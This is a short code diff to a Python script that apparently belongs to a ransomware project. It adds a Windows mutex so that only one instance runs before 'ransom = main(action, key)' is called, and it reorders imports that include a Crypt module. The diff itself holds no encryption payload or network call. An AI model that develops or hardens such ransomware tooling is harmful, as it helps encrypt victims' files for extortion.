@@ -3,12 +3,17 @@
 ## author mls
 
 # Import libs
-import Crypt
 import ctypes
 import os
 import sys
-import image as image_handle
 import getopt
+import win32api
+import winerror
+import win32event
+
+# Import classes
+import Crypt
+import image as image_handle
 
 ################
 ## Main Class ##
@@ -168,5 +173,14 @@ if __name__ == "__main__":
   if action == "decrypt" and key is None:
     sys.exit()
   else:
-    ransom = main(action, key)
+
+    # Now try to create mutex
+    mutex = win32event.CreateMutex(None, 1, "mutex_rr_windows")
+    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+      mutex = None
+      sys.exit()
+
+    # Otherwise run
+    else:
+      ransom = main(action, key)
 
